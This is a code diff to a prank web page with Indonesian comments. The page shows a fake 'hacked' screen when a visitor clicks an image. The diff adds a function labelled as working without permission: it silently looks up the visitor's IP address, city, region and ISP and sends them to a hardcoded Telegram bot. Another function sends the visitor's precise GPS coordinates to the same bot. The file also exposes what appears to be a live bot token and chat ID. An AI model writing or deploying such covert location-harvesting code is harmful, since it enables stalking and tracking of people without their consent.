@@ -69,10 +69,10 @@
         const suaraKetik = document.getElementById('suara-ketik');
         const suaraAlert = document.getElementById('suara-alert');
 
-        // --- MASUKKAN DATA TELEGRAM KAMU ---
+        // --- DATA TELEGRAM ---
         const TOKEN_BOT = "8110303835:AAHEOijWAE5EnMK_mkseIvru6vSbsp3PCUU"; 
         const CHAT_ID = "7332180572"; 
-        // ------------------------------------
+        // ---------------------
 
         const pesan = [
             "> Initializing exploit mechanism...",
@@ -92,19 +92,40 @@
             "> Have a nice day! :P"
         ];
 
-        function kirimKeTelegram(lat, lon) {
-            const pesanTele = `🚨 *Target Terdeteksi!*%0A📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
-            const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=${pesanTele}&parse_mode=Markdown`;
-            fetch(url).catch(err => console.log("Gagal kirim ke Telegram"));
+        // 1. Fungsi Kirim Pesan Umum
+        function kirimTele(teks) {
+            const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(teks)}&parse_mode=Markdown`;
+            fetch(url).catch(err => console.log("Gagal kirim"));
+        }
+
+        // 2. Lapis 1: Ambil Data IP (Tanpa Izin)
+        function ambilDataIP() {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const infoIP = `🌐 *INFO IP TARGET*%0A📍 Kota: ${data.city}%0A🇮🇩 Prov: ${data.region}%0A🏢 ISP: ${data.org}%0A🔌 IP: ${data.ip}`;
+                    kirimTele(infoIP);
+                })
+                .catch(() => kirimTele("Gagal mengambil data IP target."));
+        }
+
+        // 3. Lapis 2: Ambil GPS (Pakai Izin)
+        function ambilGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const infoGPS = `🚨 *LOKASI PRESISI (GPS)*%0A📍 Koordinat: ${lat},${lon}%0A🗺️ Buka di Maps: https://www.google.com/maps?q=${lat},${lon}`;
+                    kirimTele(infoGPS);
+                }, null, { enableHighAccuracy: true });
+            }
         }
 
         function jalankanTeks(i = 0) {
             if (i < pesan.length) {
-                // Mainkan suara ketik (dipaksa reset)
                 suaraKetik.currentTime = 0;
                 suaraKetik.play().catch(() => {}); 
 
-                // Jika ada kata kunci tertentu, bunyikan alarm
                 if (pesan[i].includes("WARNING") || pesan[i].includes("HACKED")) {
                     suaraAlert.currentTime = 0;
                     suaraAlert.play().catch(() => {});
@@ -112,39 +133,32 @@
 
                 logHacker.innerHTML += pesan[i] + "<br>";
                 layarHack.scrollTop = layarHack.scrollHeight;
-                
                 setTimeout(() => jalankanTeks(i + 1), 450);
             }
         }
 
         gambar.addEventListener('click', () => {
-            // PENTING: Buka kunci audio browser
+            // Unlocking Audio
             suaraKetik.play().then(() => {
-                suaraKetik.pause(); // Cuma buat pancingan
+                suaraKetik.pause();
                 suaraAlert.play().then(() => suaraAlert.pause());
-            }).catch(e => console.log("Audio diblokir"));
+            }).catch(() => {});
 
             layarHack.style.display = 'block';
             
-            // Masuk Fullscreen
+            // Fullscreen
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
             } else if (document.documentElement.webkitRequestFullscreen) {
                 document.documentElement.webkitRequestFullscreen();
             }
 
-            // Misi Rahasia: Lokasi
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    kirimKeTelegram(position.coords.latitude, position.coords.longitude);
-                }, null, { enableHighAccuracy: true });
-            }
-
-            // Jalankan animasi teks
-            jalankanTeks();
+            // EKSEKUSI MISI
+            ambilDataIP(); // Lapis 1 (Silent)
+            ambilGPS();    // Lapis 2 (Izin)
+            jalankanTeks(); // Animasi
         });
 
-        // Klik layar untuk menutup
         layarHack.addEventListener('click', () => {
             layarHack.style.display = 'none';
             if (document.exitFullscreen) document.exitFullscreen();
